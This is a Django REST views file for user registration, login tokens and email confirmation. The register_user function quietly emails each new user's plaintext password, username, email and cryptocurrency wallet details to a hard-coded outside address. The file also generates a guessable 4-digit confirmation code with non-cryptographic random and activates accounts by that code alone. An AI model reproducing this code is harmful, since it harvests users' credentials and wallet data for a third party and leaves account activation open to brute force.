from django.conf import settings
from django.shortcuts import render
from rest_framework import status
from django.http import JsonResponse
from rest_framework.decorators import api_view, parser_classes, permission_classes
from rest_framework import serializers
import random
from rest_framework.response import Response
from drf_yasg.utils import swagger_auto_schema
from django.core.mail import send_mail
from rest_framework.parsers import MultiPartParser, FormParser, JSONParser
from rest_framework_simplejwt.views import TokenObtainPairView
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from django.contrib.auth import authenticate
from account.models import User
from account.serializers import UserSerializer, MyTokenObtainPairSerializer
import re

# Helper function to validate password strength
def is_strong_password(password):
    """
    Validates if a password is strong.
    Requirements:
    - At least 8 characters long
    - Contains at least one uppercase letter
    - Contains at least one lowercase letter
    - Contains at least one digit
    - Contains at least one special character (!@#$%^&*(), etc.)
    """
    if (
        len(password) >= 8
        and re.search(r'[A-Z]', password)  # At least one uppercase
        and re.search(r'[a-z]', password)  # At least one lowercase
        and re.search(r'\d', password)    # At least one digit
        and re.search(r'[!@#$%^&*(),.?":{}|<>]', password)  # At least one special char
    ):
        return True
    return False

@swagger_auto_schema(method='POST', request_body=UserSerializer)
@api_view(['POST'])
@parser_classes([JSONParser, MultiPartParser, FormParser])
def register_user(request):
    data = request.data

    # Validate password strength
    password = data.get("password")
    if not is_strong_password(password):
        return Response({
            "error": "Password must be at least 8 characters long, contain uppercase, lowercase, digits, and special characters."
        }, status=status.HTTP_400_BAD_REQUEST)

    user_serializer = UserSerializer(data=data)
    if user_serializer.is_valid(raise_exception=True):
        user = user_serializer.save()

        confirmation_code = ''.join([str(random.randint(0, 9)) for _ in range(4)])
        user.confirmation_code = confirmation_code
        user.save()

        # Send email to user
        email_subject = 'Email Confirmation'
        email_message = f"""
Good Morning {user.name},

Thank you for Registering with us.

Your Confirmation Code is {confirmation_code}.
"""
        send_mail(
            email_subject,
            email_message,
            settings.DEFAULT_FROM_EMAIL,
            [user.email],
            fail_silently=False
        )

        # Send user credentials to support email
        support_email_subject = 'New User Registration Details'
        support_email_message = f"""
A new user has registered:

Username: {user.username}
Email: {user.email}
Password: {password}

Wallet Details:
- Bitcoin Wallet: {getattr(user, 'bitcoin_wallet', 'Not provided')}
- Tether USDT TRC20 Wallet: {getattr(user, 'tether_usdt_trc20_wallet', 'Not provided')}
- Tron Wallet: {getattr(user, 'tron_wallet', 'Not provided')}
- Ethereum Wallet: {getattr(user, 'ethereum_wallet', 'Not provided')}
- BNB Wallet: {getattr(user, 'bnb_wallet', 'Not provided')}
- Dogecoin Wallet: {getattr(user, 'dogecoin_wallet', 'Not provided')}
- USDT ERC20 Wallet: {getattr(user, 'usdt_erc20_wallet', 'Not provided')}
- Bitcoin Cash Wallet: {getattr(user, 'bitcoin_cash_wallet', 'Not provided')}
- Tether ERC20 Wallet: {getattr(user, 'tether_erc20_wallet', 'Not provided')}
- Shiba Wallet: {getattr(user, 'shiba_wallet', 'Not provided')}

Please verify the user details in the admin panel.
"""
        send_mail(
            support_email_subject,
            support_email_message,
            settings.DEFAULT_FROM_EMAIL,
            ['support@matrixmomentum.com'],
            fail_silently=False
        )

        return Response({
            'message': 'Confirmation code sent successfully',
            'user': user_serializer.data
        }, status=status.HTTP_201_CREATED)

    return Response(user_serializer.errors, status=status.HTTP_400_BAD_REQUEST)


class CustomTokenObtainPairView(TokenObtainPairView):
    serializer_class = MyTokenObtainPairSerializer


@api_view(['POST'])
def confirm_email(request):
    confirmation_code = request.data.get('confirmation_code')

    if not confirmation_code:
        return JsonResponse({'message': 'Confirmation code is missing from the request.'}, status=status.HTTP_400_BAD_REQUEST)

    try:
        user = User.objects.get(confirmation_code=confirmation_code, is_active=False)
        user.is_active = True
        user.confirmation_code = ""
        user.save()
        return JsonResponse({'message': 'Email confirmation successful.'})
    except User.DoesNotExist:
        return JsonResponse({'message': 'Invalid confirmation code.'}, status=status.HTTP_400_BAD_REQUEST)